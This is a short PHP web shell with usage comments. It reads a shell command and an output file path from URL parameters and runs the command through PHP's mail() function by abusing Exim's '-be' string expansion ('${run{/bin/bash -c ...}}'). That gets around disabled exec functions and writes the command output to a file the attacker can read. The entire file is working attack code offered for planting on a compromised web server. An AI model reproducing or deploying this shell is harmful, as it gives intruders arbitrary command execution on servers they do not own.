<?php
// Con7ext
// USAGE = file.php?c=COMMAND&p=/PATH/FILE < FILE TO CREATE
// EX : file.php?c=/bin/ls&p=/home/rintod/result.txt
// TO SEE RESULT ACCESS: /result.txt
$comd = @$_GET[c];
$fl = @$_GET[p];
if(function_exists("getcwd")){
    $cw = getcwd();
}
else{
    $cw = get_defined_vars()["_SERVER"]["DOCUMENT_ROOT"];
}
echo $cw."<br>";
if(!empty($comd) && !empty($fl)){
    $headers = "From: rinto@plantsec.org";
    $ms = 'Exec: ${run{/bin/bash -c "'.$comd.' >'.$fl.'"}}';
    $senders = "rinto@plantsec.org -be";
    @ob_start();
    @mail("kreonrinto@gmail.com", "Owalah Tempix", $ms, $headers, " -f $senders ");
    $mek = @ob_get_contents();
    @ob_end_clean();
    echo $mek;
}else{
    echo "Parameter c[Command] and p[Path] must me not null";
}
?>
